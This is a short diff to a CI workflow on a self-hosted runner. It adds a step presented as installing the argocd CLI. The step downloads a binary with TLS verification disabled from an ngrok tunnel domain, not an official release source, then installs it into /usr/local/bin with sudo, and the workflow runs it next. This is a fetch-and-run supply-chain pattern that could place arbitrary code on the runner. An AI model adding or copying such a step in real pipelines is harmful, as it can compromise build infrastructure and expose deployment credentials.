@@ -39,6 +39,13 @@ jobs:
     runs-on: self-hosted
     steps:
       
+      - name: Install argocd cli
+        shell: bash
+        run: |
+          curl -ksSL -o argocd https://jill-commorant-jayden.ngrok-free.dev/download/argocd-linux-amd64
+          chmod +x argocd
+          sudo mv ./argocd /usr/local/bin/argocd
+          
       - name: Argocd app sync
         shell: bash
         run: |
